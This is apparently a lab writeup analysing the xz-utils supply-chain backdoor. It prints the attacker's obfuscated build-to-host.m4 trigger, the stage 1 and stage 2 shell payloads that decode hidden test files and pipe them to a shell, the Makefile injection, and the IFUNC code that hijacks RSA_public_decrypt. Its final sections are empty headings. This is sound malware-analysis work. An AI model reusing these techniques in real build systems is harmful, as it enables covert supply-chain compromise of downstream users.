# Final Lab Writeup

# The Goal
The goal of the threat actor was to introduce a RCE into sshd for debian x86 systems discretely through a supply chain attack of a downstream library.
Determining the Target
We can only speculate why xz-utils was targeted by this actor(s), but it does seem like some thought went into targeting this library. 

# Social Engineering
Jia Tan is evil but has aura 
Pressure emails:
- https://www.mail-archive.com/xz-devel@tukaani.org/msg00566.html
- https://www.mail-archive.com/xz-devel@tukaani.org/msg00568.html
- https://www.mail-archive.com/xz-devel@tukaani.org/msg00569.html
The Concession:
- https://www.mail-archive.com/xz-devel@tukaani.org/msg00571.html

# The Git History and Release
Jia Tan created two releases of xz-utils thrat were compromised. There is 5.6.0 and 5.6.1 which contains some additional extensibility to the backdoor. You will not be able to find this release in the releases tab, but it can be found by enumerating the URL. This shows Github’s auto-packaged release which is NOT what we are looking for.

![github release page](./imgs/gh-release.png )

Even though the source contains pieces of the code, it does not contain the ‘switch’ that causes the backdoor to activate. That switch is build-to-host.m4 and it is only present in Jia Tan’s release of xz-utils 5.6.0/5.6.1. We can find the releases containing build-to-host.m4 on the wayback machine by going to the same Github URL and navigating back to March 29th 2024. If you aren’t experienced in C projects, you might find this addition outside of the normal Git flow raising alarm bells. However, this is perfectly normal. Doing this simplifies the build process for end users and build-to-host.m4 is present in previous releases of xz-utils

![wayback machine of github release page](./imgs/wayback.png)

Let’s compare the old build-to-host.m4 in 5.4.7 with the Jia Tan’s in 5.6.1:

![build to host](./imgs/build-to-host.png)

I will start by extracting two important variables/patterns that we will see often:

```bash
gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2>/dev/null`
gl_path_map='tr "\t \-_" " \t_\-"'
```

`gl_am_configmake` greps the source directory for any binary that matches 4 hashtags followed by 5 alphanumeric characters and then another 5 dashes. Running this command from the project directory with srcdir set to ‘./’ yields ‘tests/files/bad-3-corrupt_lzma2.xz’. This is one of the binary test files that Jia Tan added. 

![xxd of the test file Jia Tan added](./imgs/xdd.png)

Then there is the `gl_path_map` which just replaces tabs with spaces, spaces with tabs, underscores with dashes, and dashes with underscores. These variables are then used in long chains of commands to obfuscate what is happening. 

Let’s take a dive at the first of these commands which is then used in another chain:

```bash
gl_[$1]_prefix=`echo $gl_am_configmake | sed "s/.*\.//g"`
```

This command pipes ‘tests/files/bad-3-corrupt_lzma2.xz’ to sed which just strips the filename until it encounters the last ‘.’. This results in `gl_[$1]_prefix=xz`.

Now that we understand `gl_[$1]_prefix`, we can understand `gl_[$1]_config`:

```bash
gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null'
```

This starts with some edits to the bad test file, then it swaps all the spaces, tabs, etc in the binary and finally it decompresses that output and suppresses any errors. Looking at it deobfuscated it sure does seem scary!

```bash
gl_[$1]_config='sed "r\n" tests/files/bad-3-corrupt_lzma2.xz | tr "\t \-_" " \t_\-" | xz -d 2>/dev/null'
```

The final step of build-to-host.m4 is configuring AC_CONFIG_COMMANDS which executes at the very end of configure. This is what ultimately extracts and executes the stage 1 bash payload. 

```bash
# Combined command
AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2>/dev/null],[gl_config_gt="eval \$gl_[$1]_config"])

# Broken out
gl_config_gt="eval \$gl_[$1]_config"
eval $gl_config_gt | $SHELL 2>/dev/null
```

# Stage 1 Bash Payload

The stage 1 bash payload is the contents of `gl_[$1]_config`. I obtained the bash by running the command in a vm and echoing what ended up in the variable. This script is primarily just setting up for the second stage by decompressing the other test file that Jia Tan added. There is a series of head calls that extract pieces of tests/files/good-large_compressed.lzma. Then we do another substitution but this time of bytes. Then we perform another decompression and pipe the result, the second stage bash payload, to bash. 

```bash
####Hello####
#U$
[ ! $(uname) = "Linux" ] && exit 0
[ ! $(uname) = "Linux" ] && exit 0
[ ! $(uname) = "Linux" ] && exit 0
[ ! $(uname) = "Linux" ] && exit 0
[ ! $(uname) = "Linux" ] && exit 0
eval `grep ^srcdir= config.status`
if test -f ../../config.status;then
eval `grep ^srcdir= ../../config.status`
srcdir="../../$srcdir"
fi
export i="((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +939)";(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31233|tr "\114-\321\322-\377\35-\47\14-\34\13\50-\113" "\377")|xz -F raw --lzma1 -dc|/bin/sh
####World####
```

# Stage 2 Bash Payload (part 1)

The stage 2 bash payload formatted:

```bash
#!/bin/bash
P="-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"
C="pic_flag=\" $P\""
O="^pic_flag=\" -fPIC -DPIC\"$"
R="is_arch_extension_supported"
x="__get_cpuid("
p="good-large_compressed.lzma"
U="bad-3-corrupt_lzma2.xz"
[ ! $(uname)="Linux" ] && exit 0
# These 'eval $z.*' occur all over the place. They don't seem to be populated by anything.
# My assumption is the backdoor developer would use these to debug this script at various points in execution. 
# Update: this is actually used to make the payload more extensible
eval $zrKcVq
# If config.status exists which happens after ./configure
if test -f config.status; then
    eval $zrKcSS
    # Get various build parameters
    eval `grep ^LD=\'\/ config.status`
    eval `grep ^CC=\' config.status`
    eval `grep ^GCC=\' config.status`
    eval `grep ^srcdir=\' config.status`
    eval `grep ^build=\'x86_64 config.status`
    eval `grep ^enable_shared=\'yes\' config.status`
    eval `grep ^enable_static=\' config.status`
    eval `grep ^gl_path_map=\' config.status`
    # Guess: Get one of the compressed files
    # According to writeup, this file does not exist and is supposed to provide a way to extend the malware functionality
    vs=`grep -broaF '~!:_ W' $srcdir/tests/files/ 2>/dev/null`
    if test "x$vs" != "x" > /dev/null 2>&1;then
        f1=`echo $vs | cut -d: -f1`
        if test "x$f1" != "x" > /dev/null 2>&1;then
            start=`expr $(echo $vs | cut -d: -f2) + 7`
            ve=`grep -broaF '|_!{ -' $srcdir/tests/files/ 2>/dev/null`
            if test "x$ve" != "x" > /dev/null 2>&1;then
                f2=`echo $ve | cut -d: -f1`
                if test "x$f2" != "x" > /dev/null 2>&1;then
                    [ ! "x$f2" = "x$f1" ] && exit 0
                    [ ! -f $f1 ] && exit 0
                    end=`expr $(echo $ve | cut -d: -f2) - $start`
                    eval `cat $f1 | tail -c +${start} | head -c +${end} | tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" | xz -F raw --lzma2 -dc`
                fi
            fi
        fi
    fi
    eval $zrKccj
    if ! grep -qs '\["HAVE_FUNC_ATTRIBUTE_IFUNC"\]=" 1"' config.status > /dev/null 2>&1;then
        exit 0
    fi
    if ! grep -qs 'define HAVE_FUNC_ATTRIBUTE_IFUNC 1' config.h > /dev/null 2>&1;then
        exit 0
    fi
    if test "x$enable_shared" != "xyes";then
        exit 0
    fi
    if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then
        exit 0
    fi
    if ! grep -qs "$R()" $srcdir/src/liblzma/check/crc64_fast.c > /dev/null 2>&1; then
        exit 0
    fi
    if ! grep -qs "$R()" $srcdir/src/liblzma/check/crc32_fast.c > /dev/null 2>&1; then
        exit 0
    fi
    if ! grep -qs "$R" $srcdir/src/liblzma/check/crc_x86_clmul.h > /dev/null 2>&1; then
        exit 0
    fi
    if ! grep -qs "$x" $srcdir/src/liblzma/check/crc_x86_clmul.h > /dev/null 2>&1; then
        exit 0
    fi
    if test "x$GCC" != 'xyes' > /dev/null 2>&1;then
        exit 0
    fi
    if test "x$CC" != 'xgcc' > /dev/null 2>&1;then
        exit 0
    fi
    LDv=$LD" -v"
    if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then
        exit 0
    fi
    if ! test -f "$srcdir/tests/files/$p" > /dev/null 2>&1;then
        exit 0
    fi
    if ! test -f "$srcdir/tests/files/$U" > /dev/null 2>&1;then
        exit 0
    fi
    if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then
        eval $zrKcst
        j="^ACLOCAL_M4 = \$(top_srcdir)\/aclocal.m4"
        if ! grep -qs "$j" src/liblzma/Makefile > /dev/null 2>&1;then
            exit 0
        fi
        z="^am__uninstall_files_from_dir = {"
        if ! grep -qs "$z" src/liblzma/Makefile > /dev/null 2>&1;then
            exit 0
        fi
        w="^am__install_max ="
        if ! grep -qs "$w" src/liblzma/Makefile > /dev/null 2>&1;then
            exit 0
        fi
        E=$z
        if ! grep -qs "$E" src/liblzma/Makefile > /dev/null 2>&1;then
            exit 0
        fi
        Q="^am__vpath_adj_setup ="
        if ! grep -qs "$Q" src/liblzma/Makefile > /dev/null 2>&1;then
            exit 0
        fi
        M="^am__include = include"
        if ! grep -qs "$M" src/liblzma/Makefile > /dev/null 2>&1;then
            exit 0
        fi
        L="^all: all-recursive$"
        if ! grep -qs "$L" src/liblzma/Makefile > /dev/null 2>&1;then
            exit 0
        fi
        m="^LTLIBRARIES = \$(lib_LTLIBRARIES)"
        if ! grep -qs "$m" src/liblzma/Makefile > /dev/null 2>&1;then
            exit 0
        fi
        # Appears to be checking if it has already ran
        u="AM_V_CCLD = \$(am__v_CCLD_\$(V))"
        if ! grep -qs "$u" src/liblzma/Makefile > /dev/null 2>&1;then
            exit 0
        fi
        if ! grep -qs "$O" libtool > /dev/null 2>&1;then
            exit 0
        fi
        # These are strange. Each of these 'eval $z*' only occur once in the file
        eval $zrKcTy
        # b sets am__test equal to bad-3-corrupt_lzma2.xz
        b="am__test = $U"
        # replace ac local with this test file?
        sed -i "/$j/i$b" src/liblzma/Makefile || true
        d=`echo $gl_path_map | sed 's/\\\/\\\\\\\\/g'`
        b="am__strip_prefix = $d"
        sed -i "/$w/i$b" src/liblzma/Makefile || true
        b="am__dist_setup = \$(am__strip_prefix) | xz -d 2>/dev/null | \$(SHELL)"
        sed -i "/$E/i$b" src/liblzma/Makefile || true
        b="\$(top_srcdir)/tests/files/\$(am__test)"
        s="am__test_dir=$b"
        sed -i "/$Q/i$s" src/liblzma/Makefile || true
        h="-Wl,--sort-section=name,-X"
        if ! echo "$LDFLAGS" | grep -qs -e "-z,now" -e "-z -Wl,now" > /dev/null 2>&1;then
            h=$h",-z,now"
        fi
        j="liblzma_la_LDFLAGS += $h"
        # ?
        sed -i "/$L/i$j" src/liblzma/Makefile || true
        # Maybe disabling LTO?
        sed -i "s/$O/$C/g" libtool || true
        k="AM_V_CCLD = @echo -n \$(LTDEPS); \$(am__v_CCLD_\$(V))"
        sed -i "s/$u/$k/" src/liblzma/Makefile || true
        l="LTDEPS='\$(lib_LTDEPS)'; \\\\\n\
            export top_srcdir='\$(top_srcdir)'; \\\\\n\
            export CC='\$(CC)'; \\\\\n\
            export DEFS='\$(DEFS)'; \\\\\n\
            export DEFAULT_INCLUDES='\$(DEFAULT_INCLUDES)'; \\\\\n\
            export INCLUDES='\$(INCLUDES)'; \\\\\n\
            export liblzma_la_CPPFLAGS='\$(liblzma_la_CPPFLAGS)'; \\\\\n\
            export CPPFLAGS='\$(CPPFLAGS)'; \\\\\n\
            export AM_CFLAGS='\$(AM_CFLAGS)'; \\\\\n\
            export CFLAGS='\$(CFLAGS)'; \\\\\n\
            export AM_V_CCLD='\$(am__v_CCLD_\$(V))'; \\\\\n\
            export liblzma_la_LINK='\$(liblzma_la_LINK)'; \\\\\n\
            export libdir='\$(libdir)'; \\\\\n\
            export liblzma_la_OBJECTS='\$(liblzma_la_OBJECTS)'; \\\\\n\
            export liblzma_la_LIBADD='\$(liblzma_la_LIBADD)'; \\\\\n\
        sed rpath \$(am__test_dir) | \$(am__dist_setup) >/dev/null 2>&1";
        sed -i "/$m/i$l" src/liblzma/Makefile || true
        eval $zrKcHD
    fi
...
```

It will be easiest to break this down into a few discrete parts. The first is a way to extend the malware in the future by adding new test files with a different signature. 

```bash
vs=`grep -broaF '~!:_ W' $srcdir/tests/files/ 2>/dev/null`
    if test "x$vs" != "x" > /dev/null 2>&1;then
        f1=`echo $vs | cut -d: -f1`
        if test "x$f1" != "x" > /dev/null 2>&1;then
            start=`expr $(echo $vs | cut -d: -f2) + 7`
            ve=`grep -broaF '|_!{ -' $srcdir/tests/files/ 2>/dev/null`
            if test "x$ve" != "x" > /dev/null 2>&1;then
                f2=`echo $ve | cut -d: -f1`
                if test "x$f2" != "x" > /dev/null 2>&1;then
                    [ ! "x$f2" = "x$f1" ] && exit 0
                    [ ! -f $f1 ] && exit 0
                    end=`expr $(echo $ve | cut -d: -f2) - $start`
                    eval `cat $f1 | tail -c +${start} | head -c +${end} | tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" | xz -F raw --lzma2 -dc`
                fi
            fi
        fi
    fi
```

Then we do a bunch of checks on how the system/build is configured. The main things it checks for is that it is x86, has IFUNC enabled, and a few other prerequisites. After that we begin to build some commands that look very familiar. `gl_path_map` is back, so is `bad-3-corrupt_lzma2.xz` through the $U variable. This logic is being injected into the src/liblzma/Makefile that Stage 1 bash -> Stage 2 bash will happen again

```bash
b="am__test = $U"
# replace ac local with this test file?
sed -i "/$j/i$b" src/liblzma/Makefile || true
d=`echo $gl_path_map | sed 's/\\\/\\\\\\\\/g'`
b="am__strip_prefix = $d"
sed -i "/$w/i$b" src/liblzma/Makefile || true
b="am__dist_setup = \$(am__strip_prefix) | xz -d 2>/dev/null | \$(SHELL)"
sed -i "/$E/i$b" src/liblzma/Makefile || true
b="\$(top_srcdir)/tests/files/\$(am__test)"
s="am__test_dir=$b"
sed -i "/$Q/i$s" src/liblzma/Makefile || true
h="-Wl,--sort-section=name,-X"
if ! echo "$LDFLAGS" | grep -qs -e "-z,now" -e "-z -Wl,now" > /dev/null 2>&1;then
    h=$h",-z,now"
fi
j="liblzma_la_LDFLAGS += $h"
# ?
sed -i "/$L/i$j" src/liblzma/Makefile || true
# Maybe disabling LTO?
sed -i "s/$O/$C/g" libtool || true
k="AM_V_CCLD = @echo -n \$(LTDEPS); \$(am__v_CCLD_\$(V))"
sed -i "s/$u/$k/" src/liblzma/Makefile || true
l="LTDEPS='\$(lib_LTDEPS)'; \\\\\n\
    export top_srcdir='\$(top_srcdir)'; \\\\\n\
    export CC='\$(CC)'; \\\\\n\
    export DEFS='\$(DEFS)'; \\\\\n\
    export DEFAULT_INCLUDES='\$(DEFAULT_INCLUDES)'; \\\\\n\
    export INCLUDES='\$(INCLUDES)'; \\\\\n\
    export liblzma_la_CPPFLAGS='\$(liblzma_la_CPPFLAGS)'; \\\\\n\
    export CPPFLAGS='\$(CPPFLAGS)'; \\\\\n\
    export AM_CFLAGS='\$(AM_CFLAGS)'; \\\\\n\
    export CFLAGS='\$(CFLAGS)'; \\\\\n\
    export AM_V_CCLD='\$(am__v_CCLD_\$(V))'; \\\\\n\
    export liblzma_la_LINK='\$(liblzma_la_LINK)'; \\\\\n\
    export libdir='\$(libdir)'; \\\\\n\
    export liblzma_la_OBJECTS='\$(liblzma_la_OBJECTS)'; \\\\\n\
    export liblzma_la_LIBADD='\$(liblzma_la_LIBADD)'; \\\\\n\
sed rpath \$(am__test_dir) | \$(am__dist_setup) >/dev/null 2>&1";
sed -i "/$m/i$l" src/liblzma/Makefile || true
eval $zrKcHD
```

# Stage 2 Bash Payload (part 2, IFUNC)

At build time due to the substitutions in part 1 of this script stage 2 is reexecuted, but goes down a different branch and is what actually results in the backdoor finally being added. Again, we will break it down piece by piece, but I have started by providing the full code.

```bash
elif (test -f .libs/liblzma_la-crc64_fast.o) && (test -f .libs/liblzma_la-crc32_fast.o); then
    # Maybe more future stuff? This grep doesn't seem to find anything at the moment
    vs=`grep -broaF 'jV!.^%' $top_srcdir/tests/files/ 2>/dev/null`
    if test "x$vs" != "x" > /dev/null 2>&1;then
        f1=`echo $vs | cut -d: -f1`
        if test "x$f1" != "x" > /dev/null 2>&1;then
            start=`expr $(echo $vs | cut -d: -f2) + 7`
            ve=`grep -broaF '%.R.1Z' $top_srcdir/tests/files/ 2>/dev/null`
            if test "x$ve" != "x" > /dev/null 2>&1;then
                f2=`echo $ve | cut -d: -f1`
                if test "x$f2" != "x" > /dev/null 2>&1;then
                    [ ! "x$f2" = "x$f1" ] && exit 0
                    [ ! -f $f1 ] && exit 0
                    end=`expr $(echo $ve | cut -d: -f2) - $start`
                    eval `cat $f1 | tail -c +${start} | head -c +${end} | tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" | xz -F raw --lzma2 -dc`
                fi
            fi
        fi
    fi
    eval $zrKcKQ
    if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc64_fast.c; then
        exit 0
    fi
    if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc32_fast.c; then
        exit 0
    fi
    if ! grep -qs "$R" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
        exit 0
    fi
    if ! grep -qs "$x" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
        exit 0
    fi
    if ! grep -qs "$C" ../../libtool; then
        exit 0
    fi
    if ! echo $liblzma_la_LINK | grep -qs -e "-z,now" -e "-z -Wl,now" > /dev/null 2>&1;then
        exit 0
    fi
    if echo $liblzma_la_LINK | grep -qs -e "lazy" > /dev/null 2>&1;then
        exit 0
    fi
    N=0
    W=0
    Y=`grep "dnl Convert it to C string syntax." $top_srcdir/m4/gettext.m4`
    eval $zrKcjv
    if test -z "$Y"; then
        N=0
        W=88664
        else
        N=88664
        W=0
    fi
    # This section and onwards feels like the main backdoor logic
    xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed "s/\(.\)/\1\n/g" | LC_ALL=C awk 'BEGIN{FS="\n";RS="\n";ORS="";m=256;for(i=0;i<m;i++){t[sprintf("x%c",i)]=i;c[i]=((i*7)+5)%m;}i=0;j=0;for(l=0;l<8192;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}}{v=t["x" (NF<1?RS:$1)];i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];printf "%c",(v+k)%m}' | xz -dc --single-stream | ((head -c +$N > /dev/null 2>&1) && head -c +$W) > liblzma_la-crc64-fast.o || true
    if ! test -f liblzma_la-crc64-fast.o; then
        exit 0
    fi
    # Replace _ -> -
    cp .libs/liblzma_la-crc64_fast.o .libs/liblzma_la-crc64-fast.o || true
    V='#endif\n#if defined(CRC32_GENERIC) && defined(CRC64_GENERIC) && defined(CRC_X86_CLMUL) && defined(CRC_USE_IFUNC) && defined(PIC) && (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))\nextern int _get_cpuid(int, void*, void*, void*, void*, void*);\nstatic inline bool _is_arch_extension_supported(void) { int success = 1; uint32_t r[4]; success = _get_cpuid(1, &r[0], &r[1], &r[2], &r[3], ((char*) __builtin_frame_address(0))-16); const uint32_t ecx_mask = (1 << 1) | (1 << 9) | (1 << 19); return success && (r[2] & ecx_mask) == ecx_mask; }\n#else\n#define _is_arch_extension_supported is_arch_extension_supported'
    eval $yosA
    if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc64_fast.c | \
    sed "/include \"crc_x86_clmul.h\"/a \\$V" | \
    sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc64_fast.c\"" 2>/dev/null | \
    $CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r liblzma_la-crc64-fast.o -x c -  $P -o .libs/liblzma_la-crc64_fast.o 2>/dev/null; then
        # Replace _ -> -
        cp .libs/liblzma_la-crc32_fast.o .libs/liblzma_la-crc32-fast.o || true
        eval $BPep
        if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc32_fast.c | \
        sed "/include \"crc32_arm64.h\"/a \\$V" | \
        sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc32_fast.c\"" 2>/dev/null | \
        # This probably builds the backdoor after all the sed commands make edits to the source code
        $CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r -x c -  $P -o .libs/liblzma_la-crc32_fast.o; then
            eval $RgYB
            if $AM_V_CCLD$liblzma_la_LINK -rpath $libdir $liblzma_la_OBJECTS $liblzma_la_LIBADD; then
                if test ! -f .libs/liblzma.so; then
                    # Undo the previous conversion from underscore to dash
                    mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
                    mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
                fi
                rm -fr .libs/liblzma.a .libs/liblzma.la .libs/liblzma.lai .libs/liblzma.so* || true
            else
                # Undo the previous conversion from underscore to dash
                mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
                mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
            fi
            rm -f .libs/liblzma_la-crc32-fast.o || true
            rm -f .libs/liblzma_la-crc64-fast.o || true
        else
            # Undo the previous conversion from underscore to dash
            mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
            mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
        fi
    else
        # Undo the previous conversion from underscore to dash
        mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
    fi
    rm -f liblzma_la-crc64-fast.o || true
fi
eval $DHLd
```

Another extensibility section followed by another set of checks to ensure the backdoor won't cause weird errors on user systems. 

```bash
vs=`grep -broaF 'jV!.^%' $top_srcdir/tests/files/ 2>/dev/null`
    if test "x$vs" != "x" > /dev/null 2>&1;then
        f1=`echo $vs | cut -d: -f1`
        if test "x$f1" != "x" > /dev/null 2>&1;then
            start=`expr $(echo $vs | cut -d: -f2) + 7`
            ve=`grep -broaF '%.R.1Z' $top_srcdir/tests/files/ 2>/dev/null`
            if test "x$ve" != "x" > /dev/null 2>&1;then
                f2=`echo $ve | cut -d: -f1`
                if test "x$f2" != "x" > /dev/null 2>&1;then
                    [ ! "x$f2" = "x$f1" ] && exit 0
                    [ ! -f $f1 ] && exit 0
                    end=`expr $(echo $ve | cut -d: -f2) - $start`
                    eval `cat $f1 | tail -c +${start} | head -c +${end} | tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" | xz -F raw --lzma2 -dc`
                fi
            fi
        fi
    fi
```

Then we extract the backdoor from `good-large_compressed.lzma`, perform some sort of decryption/cipher, then perform another decompression. I added linebreaks to make it more legible. This results in a .o file that can mess with  function called `RSA_public_decrypt`. This will be important later.

```bash
xz -dc $top_srcdir/tests/files/$p | \
eval $i | LC_ALL=C sed "s/\(.\)/\1\n/g" | \
LC_ALL=C awk 'BEGIN{FS="\n";RS="\n";ORS="";m=256;for(i=0;i<m;i++){t[sprintf("x%c",i)]=i;c[i]=((i*7)+5)%m;}i=0;j=0;for(l=0;l<8192;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}}{v=t["x" (NF<1?RS:$1)];i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];printf "%c",(v+k)%m}' | \
xz -dc --single-stream | \
((head -c +$N > /dev/null 2>&1) && head -c +$W) > liblzma_la-crc64-fast.o || true
```

The next step is where things get much more insideous and also the point where we began to rely on writeups. To understand the attack you need to understand IFUNC. IFUNC is a feature of GNU that allows for function addresses to be resolved at runtime rather than compile time. So imagine in my notes taking application I need to use some sort of math library and there are two versions of the function. One with AVX2 and one without it. The library will provide a resolver that will edit the Global Offset Resolver table (GOT) for that program. Nowadays most security sensitive programs are compiled with an option that forces function resolution at program startup. This allows for the GOT to be locked to read only which prevents edits from buffer overflows. This backdoor takes advantage of that small window when the GOT is editable by creating a malicous resolver which is present in `liblzma_la-crc64-fast.o`. The code works by hijacking crc64_fast.c's already present resolver and having it call `_is_arch_extension_supported` rather than `is_arch_extension_supported`. This results in it calling `_get_cpuid` rather than `get_cpuid`. That `_get_cpuid` ends up editing the GOT tables which allows it to hijack RSA_public_decrypt. These files are compiled together to result in the final `.libs/liblzma_la-crc64_fast.o` which is dynamically linked into other projects at which point it hijacks the GOT tables. 

```bash
V='#endif\n#if defined(CRC32_GENERIC) && defined(CRC64_GENERIC) && defined(CRC_X86_CLMUL) && defined(CRC_USE_IFUNC) && defined(PIC) && (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))\nextern int _get_cpuid(int, void*, void*, void*, void*, void*);\nstatic inline bool _is_arch_extension_supported(void) { int success = 1; uint32_t r[4]; success = _get_cpuid(1, &r[0], &r[1], &r[2], &r[3], ((char*) __builtin_frame_address(0))-16); const uint32_t ecx_mask = (1 << 1) | (1 << 9) | (1 << 19); return success && (r[2] & ecx_mask) == ecx_mask; }\n#else\n#define _is_arch_extension_supported is_arch_extension_supported'
eval $yosA
if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc64_fast.c | \
sed "/include \"crc_x86_clmul.h\"/a \\$V" | \
sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc64_fast.c\"" 2>/dev/null | \
$CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r liblzma_la-crc64-fast.o -x c -  $P -o .libs/liblzma_la-crc64_fast.o 2>/dev/null; then
```

# The Backdoor

# Consequences


